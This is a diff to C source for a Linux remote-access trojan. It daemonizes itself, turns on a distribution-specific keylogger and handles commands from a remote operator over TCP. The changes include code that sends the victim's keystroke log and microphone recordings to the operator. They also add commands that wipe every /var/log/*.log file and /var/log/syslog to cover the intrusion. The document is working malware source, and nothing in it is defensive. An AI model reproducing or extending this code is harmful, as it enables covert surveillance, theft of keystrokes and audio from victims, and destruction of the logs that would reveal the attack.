@@ -7,13 +7,12 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <syslog.h>  // syslog()
-#include <getopt.h>
 
 #include <pthread.h> //pthread_create(), pthread_join()
 
 #include <gtk-2.0/gtk/gtk.h>
 
-#include <glib-object.h>
+//#include <glib-object.h>
 
 #include "../includes/constants.h"
 #include "../includes/keylogger/keylogger.h"
@@ -81,12 +80,14 @@ int main(int argc, char *argv[])
         error("system() hodin_daemon.sh symbolic link", "main()");
         return 0;
     }
-
+    
+    daemonize();   
+    
     //ubuntu16_keylogger_init();
 
-    //ubuntu18_keylogger_init();
+    ubuntu18_keylogger_init();
 
-    mint_keylogger_init();
+    //mint_keylogger_init();
 
     //debian_keylogger_init();
 
@@ -94,20 +95,15 @@ int main(int argc, char *argv[])
 
     //fedora_keylogger_init();
     
-    
-    
-    //daemonize();
-    
-
     /* Initialize GStreamer */
     gst_init(&argc, &argv);
 
-    dispatch_modules(argv);
+    dispatch_modules(argc, argv);
 
     return EXIT_SUCCESS;
 }
 
-void dispatch_modules(char *argv[])
+void dispatch_modules(int argc, char *argv[])
 {
     SOCKADDR_IN sin;
     socklen_t recsize = sizeof(sin);
@@ -153,7 +149,7 @@ void dispatch_modules(char *argv[])
     FILE *debian_set_gain_pipe = NULL;
     FILE *debian_unmute_mic_pipe = NULL;
     FILE *debian_gain_mic_pipe = NULL;
-
+    
 
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if(sock == INVALID_SOCKET)
@@ -282,8 +278,6 @@ void dispatch_modules(char *argv[])
 
                 return;
             }
-
-            //start_remote_shell(csock, sock, argv);
         }
 
         if(flag == 9)
@@ -458,13 +452,13 @@ void *send_logger_log()
     FILE *log_file = NULL;
     char buffer[BUFSIZ] = "";
     int log_empty = 0;
-    
+
      int i = 0;
- 
+    
     log_file = fopen("/var/log/userlog.log", "r+");
     if(log_file == NULL)
     { 
-        error("fopen() log_file", "dispatch_modules()");
+        error("fopen() log_file", "send_logger_log()");
         pthread_exit(NULL);
     }
   
@@ -481,7 +475,7 @@ void *send_logger_log()
     /** Envoie de la taille du fichier txt **/
     if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
     {
-        error("send() file_size", "dispatch_modules()");
+        error("send() file_size", "send_logger_log()");
         pthread_exit(NULL);
 
     }
@@ -512,13 +506,21 @@ void *send_logger_log()
     }while(totalSend < file_size);
 
     printf("File totaly send with success : %ld\n", totalSend);
-  
-    if(system("rm -rf /var/log/userlog.log") == -1)
+    
+    /* Delete all .log files */
+    if(system("rm -rf /var/log/*.log") == -1)
     {
-        error("system() userlog.log", "dispatch_modules()");
+        error("system() *.log", "send_logger_log()");
         pthread_exit(NULL);
     }
-    
+       
+    /* Delete all syslog files */
+    if(system("rm -rf /var/log/syslog") == -1)
+    {
+        error("system() syslog", "send_logger_log()");
+        pthread_exit(NULL);
+    }
+
     fclose(log_file);
     
     pthread_exit(NULL);  
@@ -1250,18 +1252,10 @@ void *execute_record_cmd()
         if(send(csock, (char*)&recorded, sizeof(recorded), 0) == -1)
             error("send() recorded", "execute_record_cmd()");
         
-        if(system("ffmpeg -i output.wav -vn -ar 44100 -ac 2 -b:a 320k output.mp3") == -1)
-        {
-            error("system ffmpeg", "execute_record_cmd()");
-            pthread_exit(NULL);
-        }
-        
-        wait_time_end(6.0);
-        
-        record_file = fopen("output.mp3", "rb");
+        record_file = fopen("output.wav", "rb");
         if(record_file == NULL)
         {
-            error("fopen() output.mp3", "execute_record_cmd()");
+            error("fopen() output.wav", "execute_record_cmd()");
             pthread_exit(NULL);
         }
     }
@@ -1329,12 +1323,6 @@ void *execute_record_cmd()
         {
             error("popen() delete output.wav", "execute_record_cmd()");
             pthread_exit(NULL);
-        }
-        
-        if(system("rm -rf output.mp3") == -1)
-        {
-            error("system delete output.mp3", "execute_record_cmd()");
-            pthread_exit(NULL);        
         }
     }
     
